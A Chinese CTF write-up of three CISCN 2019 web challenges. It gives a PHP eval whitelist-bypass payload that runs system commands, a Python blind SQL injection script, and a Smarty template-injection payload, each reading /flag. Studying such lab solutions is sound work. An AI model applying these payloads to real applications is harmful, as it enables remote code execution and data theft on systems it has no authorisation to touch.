# CISCN 2019

## Web

### \[初赛] Love Math

**题目**

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

通过代码审计可以得出要求

* 字符不得超过 80 个
* 字符必须在白名单，并且不能出现黑名单上的字符

我们需要构造 `system(cat /flag)` ，需要使得 `c=($_GET[1])($_GET[2])` 。

首先是得将转换得到 `hex2bin()` 函数，由于存在 x 所以我们需要至少 34 进制（

`hex2bin` 34 进制转 16 进制得到 `26941962055` ，此时 `base_convert(26941962055,10,34) = hex2bin` 。

`_GET` 字符串转 16 进制得到 `5f474554` 再转成 10 进制得到 `1598506324` ，此时如下代码

```php
<?php
echo (base_convert(26941962055,10,34))(dechex(1598506324));
```

的结果就是 `_GET` ，接下来就是处理 `$` 符号，需要通过引用变量来触发，中括号不在白名单那就用大括号，构造 Payload 如下

```
c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));($$pi){1}(($$pi){2})&1=system&2=cat /flag
```



### \[华北赛区 Day2 Web1] Hack World

```python
import time
import requests

url = 'http://b478134c-6e5f-4069-8910-4f12fc9bab6c.node4.buuoj.cn:81/'
results = []
session = requests.Session()

for i in range(1,43):
    start = 32
    end = 127
    for j in range(start, end):
        mid = (start + end) // 2
        data = {"id": f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"}
        time.sleep(0.1)
        ret = session.post(url, data=data)
        if 'Hello, glzjin wants a girlfriend.' in ret.text:
            start = mid
        else:
            end = mid
        if (end - start) <= 1:
            results.append(chr(end))
            print(''.join(results))
            break
```

### \[华东南赛区] Web11

底部带有提示 `Build With Smarty !` ，猜测是 Smarty SSTI 注入。

* `{php}{/php}` ，在 Smarty 3.1， `{php}{/php}` 仅在 SmartyBC 中可用。
* `{literal}` ，使得模板字符原样输出。
* `getStreamVariable` ，读取一个文件并返回内容
* `{if}{/if}`

构造 Payload 如下

```
{if system('cat /flag')}{/if}
```

查看源代码即可获得 flag 。
